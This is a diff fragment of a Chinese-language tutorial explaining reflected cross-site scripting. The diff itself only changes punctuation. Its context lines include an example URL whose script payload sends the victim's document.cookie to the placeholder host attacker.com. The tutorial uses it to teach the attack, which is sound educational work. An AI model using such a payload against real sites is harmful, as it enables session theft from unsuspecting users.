@@ -36,7 +36,7 @@ xss（cross-site scripting跨域脚本攻击），一般分为两类：
 这种类型的xss攻击是简单地把用户输入的数据“反射”给浏览器。此时黑客需要诱使用户“点击”一个恶意链接，才能成功。
 
 案例一：
-1. 用户登录某网站(www.myWeb.com)，产生认证token，存储在cookie中，如`set cookie: sessId=183dsjfk3498djncrueiw`。
+1. 用户登录某网站（www.myWeb.com），产生认证token，存储在cookie中，如`set cookie: sessId=183dsjfk3498djncrueiw`。
 1. 存在某页面`www.myWeb.com/somePage`，它会获取地址栏中的message参数
 1. 黑客通过一些途径让用户提交如下url，`www.myWeb.com/somePage?message=<script>var+i=new+Image;i.src="http://attacker.com/"%2bdocument.cookie</script>`
 1. somePage页面通过提取message执行了里面的script代码，也想攻击者的网站attacker.com发起请求，并将cookie带了过去
